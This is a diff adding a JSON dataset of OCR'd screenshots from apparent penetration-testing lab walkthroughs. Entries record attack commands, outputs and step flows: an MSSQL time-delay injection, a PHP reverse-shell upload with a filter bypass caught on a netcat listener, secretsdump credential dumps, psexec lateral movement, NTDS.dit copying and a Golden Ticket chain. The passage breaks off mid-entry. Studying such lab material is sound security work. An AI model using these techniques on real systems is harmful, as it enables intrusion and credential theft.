@@ -1,0 +1,710 @@
+[
+  {
+    "source": {
+      "url": "assets/medtech/capture-001-76d7a3b6a4.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "76d7a3b6a4f7c7b87753ee1ff7f69556bda371fa238f94eb5190c1ae17fac21f",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -X POST http://medtech.com/login.aspx --data-urlencode \"Username='; WAITFOR delay '0:0:10';--\" --data-urlencode \"Password=\"",
+        "tool": "browser",
+        "raw_output": "URL: http://medtech.com/login.aspx\n<h1>Patient Portal - MedTech</h1>\n<input name=\"Username\" value=\"'; WAITFOR delay '0:0:10';--\">\n<input name=\"Password\" value=\"\">\n<button>Login</button>\n<p>Invalid credentials. Please try again.</p>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.title"
+      },
+      {
+        "kind": "web.login_form"
+      },
+      {
+        "kind": "web.parameterized"
+      },
+      {
+        "kind": "web.sqli_confirmed"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Browse http://medtech.com/login.aspx Patient Portal login form",
+      "Inject stacked MSSQL time-delay probe '; WAITFOR delay '0:0:10';-- into Username input",
+      "Confirm 10-second MSSQL delay prior to sp_configure / xp_cmdshell RCE"
+    ],
+    "notes": "Browser screenshot from labs/medtech/hosts/web02-121.md (line 88) revealing the omitted medtech.com hostname, /login.aspx Patient Portal endpoint, vulnerable Username field, and stacked time-based blind MSSQL probe '; WAITFOR delay '0:0:10';--."
+  },
+  {
+    "source": {
+      "url": "assets/skylark/capture-001-98c1b46b25.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "98c1b46b252eece3fec6db199764bfe9ac41f6e7388379a60d80f5f07d28bd98",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i -X POST http://192.168.212.225:8090/backend/default/uploader.php -H 'Cookie: PHPSESSID=<redacted>' -H 'Referer: http://192.168.212.225:8090/backend/default/upload.php' -F 'upfile=@shell.php;type=application/pdf'",
+        "tool": "burp",
+        "raw_output": "POST /backend/default/uploader.php HTTP/1.1\r\nHost: 192.168.212.225:8090\r\nContent-Type: multipart/form-data; boundary=---------------------------47947879638164488891687188785\r\nReferer: http://192.168.212.225:8090/backend/default/upload.php\r\nCookie: PHPSESSID=<redacted>\r\n\r\n-----------------------------47947879638164488891687188785\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"shell.php\"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4\r\n<?php\r\n// php-reverse-shell - A Reverse Shell implementation in PHP",
+        "truncated": true,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.paths"
+      },
+      {
+        "kind": "web.upload_form"
+      },
+      {
+        "kind": "web.upload_confirmed"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Authenticate to /backend/default/upload.php on port 8090",
+      "Intercept POST /backend/default/uploader.php in Burp Suite",
+      "Bypass PDF upload filter with Content-Type: application/pdf and %PDF-1.4 magic header before <?php reverse shell"
+    ],
+    "notes": "Burp Suite Raw request screenshot from labs/skylark/hosts/singapore06-225.md (line 36) revealing the omitted upload handler /backend/default/uploader.php, Referer /backend/default/upload.php, multipart field name=\"upfile\"; filename=\"shell.php\", Content-Type: application/pdf, and %PDF-1.4 magic-byte filter bypass."
+  },
+  {
+    "source": {
+      "url": "assets/skylark/capture-002-5dde09c17f.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "5dde09c17f080331e3511694de9a3ecb81ea98668d8af66b6bfd895570d8badf",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "curl -i http://192.168.212.225:8090/backend/default/uploads/shell.php",
+        "tool": "browser",
+        "raw_output": "URL: http://192.168.212.225:8090/backend/default/uploads/shell.php\n504 Gateway Time-out\nnginx/1.18.0 (Ubuntu)",
+        "truncated": false,
+        "fidelity": "ocr"
+      },
+      {
+        "command_shown": "nc -nvlp 443",
+        "tool": "nc",
+        "raw_output": "listening on [any] 443 ...\nconnect to [192.168.45.221] from (UNKNOWN) [192.168.212.225] 45260\nLinux singapore06 5.15.0-53-generic #59~20.04.1-Ubuntu SMP Thu Oct 20 15:10:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n 05:06:16 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n$ ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    inet 127.0.0.1/8 scope host lo\n3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    inet 192.168.212.225/24 brd 192.168.212.255 scope global noprefixroute ens192",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.paths"
+      },
+      {
+        "kind": "web.rce"
+      },
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "host.kernel"
+      },
+      {
+        "kind": "scan.local.interfaces"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Trigger uploaded PHP payload at /backend/default/uploads/shell.php on port 8090",
+      "Catch reverse shell on nc -nvlp 443 as uid=33(www-data) on singapore06",
+      "Enumerate local network interfaces via ip a"
+    ],
+    "notes": "Browser + terminal screenshot from labs/skylark/hosts/singapore06-225.md (line 37) disclosing the uploaded shell URL /backend/default/uploads/shell.php, Linux 5.15.0-53-generic Ubuntu 20.04.1 kernel banner, uid=33(www-data) shell foothold, and ip a interface output."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-001-90eed43cfe.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "90eed43cfe3444002272d8ea9657bc547146f7dbc276a68cc66e6b8d319b322c",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "evil-winrm -i 192.168.158.159 -u 'Eric.Wallows' -p '<redacted>'",
+        "tool": "evil-winrm",
+        "raw_output": "Info: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\eric.wallows\\Documents> whoami /groups\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                           Type             SID          Attributes\n==================================== ================ ============ ===============================================================\nEveryone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner\nBUILTIN\\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nMandatory Label\\High Mandatory Level Label            S-1-16-12288",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "winrm.authenticated"
+      },
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "access.admin"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Assumed-breach Evil-WinRM login to CLIENT01 (192.168.158.159) as eric.wallows",
+      "Verify BUILTIN\\Administrators and High Mandatory Level via whoami /groups"
+    ],
+    "notes": "Evil-WinRM screenshot from labs/zeus/walkthrough.md (line 76) preserving 'Info: Establishing connection to remote endpoint' and '*Evil-WinRM* PS C:\\Users\\eric.wallows\\Documents>', proving the initial WinRM login step omitted between the nmap and whoami /groups blocks in Markdown."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-003-e254e5b19c.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "e254e5b19c441b21de7401e37ff38feafae329aa76ee5d0c3293bdb22ac496e2",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python3 secretsdump.py zeus.corp/Eric.Wallows:<redacted>@192.168.158.159",
+        "tool": "secretsdump",
+        "raw_output": "[*] Target system bootKey: <redacted>\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:<redacted>:<redacted>:::\nGuest:501:<redacted>:<redacted>:::\nDefaultAccount:503:<redacted>:<redacted>:::\nWDAGUtilityAccount:504:<redacted>:<redacted>:::\n[*] Dumping cached domain logon information (domain/username:hash)\nZEUS.CORP/Administrator:$DCC2$10240#Administrator#<redacted>: (2022-06-29 02:23:41+00:00)\nZEUS.CORP/o.foller:$DCC2$10240#o.foller#<redacted>: (2024-10-01 12:55:03+00:00)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC\nzeus\\CLIENT01$:aes256-cts-hmac-sha1-96:<redacted>\nzeus\\CLIENT01$:<redacted>:<redacted>:::\n[*] DPAPI_SYSTEM\ndpapi_machinekey:<redacted>\ndpapi_userkey:<redacted>\n[*] NL$KM\nNL$KM:<redacted>\n[*] _SC_SNMPTRAP\nzeus\\o.foller:<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.sam"
+      },
+      {
+        "kind": "hash.ntlm"
+      },
+      {
+        "kind": "hash.mscache2"
+      },
+      {
+        "kind": "credential.plaintext"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Remote secretsdump.py against CLIENT01 (192.168.158.159)",
+      "Dump un-elided SAM NTLM hashes, MSCacheV2 DCC2 hashes, and _SC_SNMPTRAP LSA service cleartext for zeus\\o.foller"
+    ],
+    "notes": "Terminal screenshot from labs/zeus/walkthrough.md (line 113) restoring the full SAM hash lines (Markdown elided LM hash as '...') plus omitted MSCacheV2 ($DCC2$) hashes for ZEUS.CORP/Administrator and ZEUS.CORP/o.foller, $MACHINE.ACC, DPAPI_SYSTEM, NL$KM, and the [*] _SC_SNMPTRAP LSA section header."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-004-530ff14b0a.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "530ff14b0afdc474e13898fdc5c2a481079af1fbc1c23939390fd494e17e7648",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "~/impacket-latest/examples/psexec.py zeus.corp/o.foller:<redacted>@192.168.158.160",
+        "tool": "psexec",
+        "raw_output": "[*] Requesting shares on 192.168.158.160.....\n[*] Found writable share ADMIN$\n[*] Uploading file EonzMUFd.exe\n[*] Opening SVCManager on 192.168.158.160.....\n[*] Creating service iJww on 192.168.158.160.....\n[*] Starting service iJww.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.19042.631]\n(c) 2020 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "access.admin_share"
+      },
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "access.system"
+      },
+      {
+        "kind": "host.os_family"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Lateral movement to CLIENT02 (192.168.158.160) via Impacket psexec.py as zeus.corp/o.foller",
+      "Verify writable ADMIN$ share, service creation, and nt authority\\system shell"
+    ],
+    "notes": "Terminal screenshot from labs/zeus/walkthrough.md (line 204) capturing the full Impacket psexec.py banner ('Found writable share ADMIN$', service iJww creation, Windows 10.0.19042.631) omitted from the adjacent '# Results' Markdown summary."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-005-bb0cbacd1b.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "bb0cbacd1b0ba163522aaafaaabe007e847dcb44defbebaf503b41cbcbddb6d4",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "powershell -c \"Expand-Archive -LiteralPath 'C:\\Users\\z.thomas\\Downloads\\Onboarding Document.docx' -DestinationPath C:\\Windows\\Temp\\doc -Force; Get-Content C:\\Windows\\Temp\\doc\\word\\document.xml\"",
+        "tool": "wordpad",
+        "raw_output": "Dear Zachary,\n\nWelcome to our team.\nBelow you can find your credentials. Please change them after you log in.\n\nz.thomas\n<redacted>\n\nSincerely\nZeus Corp",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.material"
+      },
+      {
+        "kind": "credential.plaintext"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Open C:\\Users\\z.thomas\\Downloads\\Onboarding Document.docx on CLIENT02",
+      "Extract cleartext domain credentials for z.thomas"
+    ],
+    "notes": "GUI document capture from labs/zeus/walkthrough.md (line 242) showing the full onboarding letter text inside C:\\Users\\z.thomas\\Downloads\\Onboarding Document.docx (adjacent Markdown block only contained a '#Found credentials:' comment)."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-006-372349e554.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "372349e554dcfe6c61da9fd1b561f68929cb46b9650fc773ef375df41335c167",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "bloodhound-python -d zeus.corp -u z.thomas -p '<redacted>' -c All -ns 192.168.158.158",
+        "tool": "bloodhound",
+        "raw_output": "Z.THOMAS@ZEUS.CORP -[GenericAll]-> D.CHAMBERS@ZEUS.CORP",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ad.graph.collected"
+      },
+      {
+        "kind": "ad.acl_lead"
+      },
+      {
+        "kind": "ad.acl_paths"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Inspect SharpHound graph in BloodHound as Z.THOMAS@ZEUS.CORP",
+      "Identify outbound GenericAll ACL edge from Z.THOMAS@ZEUS.CORP to D.CHAMBERS@ZEUS.CORP"
+    ],
+    "notes": "BloodHound graph screenshot from labs/zeus/walkthrough.md (line 286) proving Z.THOMAS@ZEUS.CORP holds GenericAll over D.CHAMBERS@ZEUS.CORP; the GenericAll edge label never appeared in the Markdown prose or code blocks."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-007-1f5b3e58b8.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "1f5b3e58b83ce2d0c11ea2e35c8a4f8b645a3854e30fad260bc4cc57073ddf7f",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "net user d.chambers /domain",
+        "tool": "bloodhound",
+        "raw_output": "D.CHAMBERS@ZEUS.CORP -[MemberOf]-> DOMAIN USERS@ZEUS.CORP -[MemberOf]-> USERS@ZEUS.CORP\nD.CHAMBERS@ZEUS.CORP -[MemberOf]-> REMOTE MANAGEMENT USERS@ZEUS.CORP\nD.CHAMBERS@ZEUS.CORP -[MemberOf]-> BACKUP OPERATORS@ZEUS.CORP",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ad.group_list"
+      },
+      {
+        "kind": "ad.attack_paths"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Inspect group memberships of D.CHAMBERS@ZEUS.CORP in BloodHound",
+      "Confirm REMOTE MANAGEMENT USERS@ZEUS.CORP and BACKUP OPERATORS@ZEUS.CORP memberships"
+    ],
+    "notes": "BloodHound group-membership screenshot from labs/zeus/walkthrough.md (line 287) revealing D.CHAMBERS@ZEUS.CORP membership in REMOTE MANAGEMENT USERS@ZEUS.CORP (omitted from Markdown) alongside BACKUP OPERATORS@ZEUS.CORP."
+  },
+  {
+    "source": {
+      "url": "assets/zeus/capture-008-5b3c863f28.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "5b3c863f283f35d9ce9aa082dd41ef73d5ef229e437f843239de809a6932d7de",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "net user d.chambers <redacted> /domain",
+        "tool": "net",
+        "raw_output": "*Evil-WinRM* PS C:\\Users\\z.thomas\\Documents> net user d.chambers <redacted> /domain\nThe command completed successfully.",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.available"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Abuse GenericAll from z.thomas Evil-WinRM session via net user d.chambers <redacted> /domain",
+      "Confirm password reset succeeded before Evil-WinRM login to DC01 as d.chambers"
+    ],
+    "notes": "Evil-WinRM screenshot from labs/zeus/walkthrough.md (line 300) showing the z.thomas session prompt and 'The command completed successfully.' stdout omitted from the adjacent Markdown code block."
+  },
+  {
+    "source": {
+      "url": "assets/poseidon/capture-003-ec3a7e50d8.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "ec3a7e50d86dfce5d9ba008274fcba93307719e7b7deb6a7ec2111298569af1c",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python3 secretsdump.py 'Eric.Wallows:<redacted>@192.168.107.163'",
+        "tool": "secretsdump",
+        "raw_output": "[*] Target system bootKey: <redacted>\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:<redacted>:<redacted>:::\nGuest:501:<redacted>:<redacted>:::\nDefaultAccount:503:<redacted>:<redacted>:::\nWDAGUtilityAccount:504:<redacted>:<redacted>:::\n[*] Dumping cached domain logon information (domain/username:hash)\nSUB.POSEIDON.YZX/lisa:$DCC2$10240#lisa#<redacted>: (2024-12-03 17:01:07+00:00)\n[*] Dumping LSA Secrets\n[*] $MACHINE.ACC\nsub\\GYOZA$:aes256-cts-hmac-sha1-96:<redacted>\nsub\\GYOZA$:<redacted>:<redacted>:::\n[*] DefaultPassword\nsub.poseidon.yzx\\lisa:<redacted>\n[*] DPAPI_SYSTEM\ndpapi_machinekey:<redacted>\ndpapi_userkey:<redacted>\n[*] NL$KM\nNL$KM:<redacted>\n[*] _SC_SNMPTRAP\nsub\\lisa:<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.sam"
+      },
+      {
+        "kind": "hash.ntlm"
+      },
+      {
+        "kind": "hash.mscache2"
+      },
+      {
+        "kind": "credential.plaintext"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Remote secretsdump.py against GYOZA (192.168.107.163)",
+      "Recover SAM hashes, MSCacheV2 DCC2 hash for SUB.POSEIDON.YZX/lisa, DefaultPassword, and _SC_SNMPTRAP LSA cleartext"
+    ],
+    "notes": "Terminal screenshot from labs/poseidon/walkthrough.md (line 162) preserving omitted MSCacheV2 ($DCC2$) hash for SUB.POSEIDON.YZX/lisa plus [*] DefaultPassword and [*] _SC_SNMPTRAP LSA section headers and domain prefixes stripped from the adjacent Markdown summary."
+  },
+  {
+    "source": {
+      "url": "assets/poseidon/capture-004-6dbb5c2250.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "6dbb5c2250dfaf7af3fc077a6979e33e0e93644369090acc4bb4b67a03e2eba8",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "bloodhound-python -d sub.poseidon.yzx -u lisa -p '<redacted>' -c All -ns 192.168.107.162",
+        "tool": "bloodhound",
+        "raw_output": "LISA@SUB.POSEIDON.YZX -[AllExtendedRights]-> JACKIE@SUB.POSEIDON.YZX",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ad.graph.collected"
+      },
+      {
+        "kind": "ad.acl_lead"
+      },
+      {
+        "kind": "ad.acl_paths"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Analyze child domain sub.poseidon.yzx SharpHound collection in BloodHound",
+      "Identify AllExtendedRights edge from LISA@SUB.POSEIDON.YZX to JACKIE@SUB.POSEIDON.YZX",
+      "Reset jackie password via net rpc password against DC02"
+    ],
+    "notes": "BloodHound graph screenshot from labs/poseidon/walkthrough.md (line 183) identifying the exact source and target nodes LISA@SUB.POSEIDON.YZX -[AllExtendedRights]-> JACKIE@SUB.POSEIDON.YZX (adjacent Markdown block only wrote '#AllExtendedRights')."
+  },
+  {
+    "source": {
+      "url": "assets/poseidon/capture-005-8518a78e94.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "8518a78e94027d86940da3394e18051e7f1873faeb68d732ae92a7988239c90e",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "whoami /priv",
+        "tool": "whoami",
+        "raw_output": "*Evil-WinRM* PS C:\\Users\\jackie\\Desktop> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "privesc.token.sebackup"
+      },
+      {
+        "kind": "privesc.token.serestore"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Evil-WinRM login to DC02 (192.168.107.162) as jackie",
+      "Run whoami /priv to discover SeBackupPrivilege and SeRestorePrivilege Enabled",
+      "Proceed to diskshadow + robocopy /b NTDS.DIT extraction"
+    ],
+    "notes": "Critical Evil-WinRM screenshot from labs/poseidon/walkthrough.md (line 209): the adjacent fenced block on line 207 contained only 'whoami /priv' with zero stdout, so SeBackupPrivilege and SeRestorePrivilege on DC02 exist solely in this image."
+  },
+  {
+    "source": {
+      "url": "assets/poseidon/capture-007-6dab076b91.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "6dab076b91208edf45465f95dcbebc20840dae1459fdeefc0d4621a2f1b19884",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "robocopy /b E:\\Windows\\NTDS . ntds.dit",
+        "tool": "robocopy",
+        "raw_output": "------------------------------------------------------------------------------\n\n               Total    Copied   Skipped  Mismatch    FAILED    Extras\n    Dirs :         1         0         1         0         0         0\n   Files :         1         1         0         0         0         0\n   Bytes :   24.00 m   24.00 m         0         0         0         0\n   Times :   0:00:00   0:00:00                       0:00:00   0:00:00\n\n\n   Speed :           178481021 Bytes/sec.\n   Speed :           10212.765 MegaBytes/min.\n   Ended : Tuesday, April 7, 2026 5:54:53 PM",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.ntds"
+      },
+      {
+        "kind": "loot.files"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Expose VSS shadow copy of C: on drive E: via diskshadow",
+      "Copy 24.00 MB ntds.dit using robocopy /b backup mode with 0 failures"
+    ],
+    "notes": "Terminal screenshot from labs/poseidon/walkthrough.md (line 241) providing the robocopy /b completion table ('Files : 1 Copied', '24.00 m') omitted from the zero-stdout fenced block on line 239."
+  },
+  {
+    "source": {
+      "url": "assets/poseidon/capture-009-d043cd8135.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "d043cd8135a2c0943cffb669f7fb100c8c3df2ac22602f6c5d045ec9381b75a9",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python3 psexec.py sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass",
+        "tool": "psexec",
+        "raw_output": "[*] Requesting shares on DC01.poseidon.yzx.....\n[*] Found writable share ADMIN$\n[*] Uploading file amlrhaku.exe\n[*] Opening SVCManager on DC01.poseidon.yzx.....\n[*] Creating service yKSQ on DC01.poseidon.yzx.....\n[*] Starting service yKSQ.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> whoami\nnt authority\\system",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "access.admin_share"
+      },
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "access.system"
+      },
+      {
+        "kind": "host.os_family"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Forge Extra-SID Golden Ticket with Enterprise Admins SID -519 via ticketer.py",
+      "Export KRB5CCNAME=Administrator.ccache",
+      "Execute psexec.py -k -no-pass against forest-root DC01.poseidon.yzx to obtain nt authority\\system shell"
+    ],
+    "notes": "Critical terminal screenshot from labs/poseidon/walkthrough.md (line 353): the adjacent fenced block on line 346 had zero stdout for psexec.py against forest-root DC01.poseidon.yzx, whereas this image proves writable ADMIN$ share, Windows Server 2016 (10.0.14393), and nt authority\\system compromise."
+  },
+  {
+    "source": {
+      "url": "assets/laser/capture-001-36d5f991e5.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "36d5f991e578347ff239dac64e31e2980ca4dd56f37bf45082bc2da4b61c581b",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "download traffic-capture-latest.pcapng",
+        "tool": "evil-winrm",
+        "raw_output": "Info: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> download traffic-capture-latest.pcapng\n\nInfo: Downloading C:\\Users\\Administrator\\Documents\\traffic-capture-latest.pcapng to traffic-capture-latest.pcapng",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "winrm.authenticated"
+      },
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "loot.files"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Pass-the-Hash Evil-WinRM login to MS02 (192.168.107.174) as local Administrator",
+      "Exfiltrate C:\\Users\\Administrator\\Documents\\traffic-capture-latest.pcapng"
+    ],
+    "notes": "Evil-WinRM screenshot from labs/laser/walkthrough.md (line 109) proving session establishment on MS02 and full path C:\\Users\\Administrator\\Documents\\traffic-capture-latest.pcapng omitted from adjacent fenced blocks."
+  },
+  {
+    "source": {
+      "url": "assets/laser/capture-002-d87028a0d5.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "d87028a0d557b9525c691145e6cc39a5476b50a6482134f0d392f72ab56ad765",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "tshark -r traffic-capture-latest.pcapng -Y 'http.request.method == \"POST\" && http.request.uri == \"/login\"' -V",
+        "tool": "wireshark",
+        "raw_output": "10944  192.168.118.2 -> 192.168.118.2  HTTP  GET /health HTTP/1.1\n10966  192.168.118.2 -> 192.168.118.2  HTTP  POST /update-config HTTP/1.1 , JSON (application/json)\n10980  192.168.118.2 -> 192.168.118.2  HTTP  POST /contact HTTP/1.1  (application/x-www-form-urlencoded)\n10994  192.168.118.2 -> 192.168.118.2  HTTP  POST /login HTTP/1.1  (application/x-www-form-urlencoded)\n10998  192.168.118.2 -> 192.168.118.2  HTTP  HTTP/1.1 200 OK  (text/html)\n\nPOST /login HTTP/1.1\r\nHost: 192.168.118.2:5000\r\nUser-Agent: curl/8.11.1\r\nContent-Length: 44\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nForm item: \"username\" = \"yulia.weber\"\nForm item: \"password\" = \"<redacted>\"",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.material"
+      },
+      {
+        "kind": "credential.plaintext"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Filter traffic-capture-latest.pcapng for http frames in Wireshark",
+      "Inspect Frame 10994 POST http://192.168.118.2:5000/login form-urlencoded payload",
+      "Recover domain user yulia.weber cleartext password"
+    ],
+    "notes": "Wireshark GUI screenshot from labs/laser/walkthrough.md (line 127) exposing the actual HTTP packets to 192.168.118.2:5000 (/health, /update-config, /contact, /login) and Frame 10994 POST /login form items username=yulia.weber & password=<redacted> (Markdown only had '# Poss Creds Found:')."
+  },
+  {
+    "source": {
+      "url": "assets/laser/capture-003-bf3d0735ef.png",
+      "retrieved": "2026-10-30"
+    },
+    "asset": {
+      "hash": "bf3d0735ef7216b6c117811bf2972d8574f9c45299c6e101aa9ff3af9acd94d0",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "bloodhound-python -d laser.com -u Eric.Wallows -p '<redacted>' -c All -ns 192.168.107.172",
+        "tool": "bloodhound",
+        "raw_output": "YULIA.WEBER@LASER.COM -[GenericWrite]-> BORIS.CRAWFORD@LASER.COM",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ad.graph.collected"
+      },
+      {
+        "kind": "ad.acl_lead"
+      },
+      {
+        "kind": "ad.acl_paths"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Query outbound object control for YULIA.WEBER@LASER.COM in BloodHound",
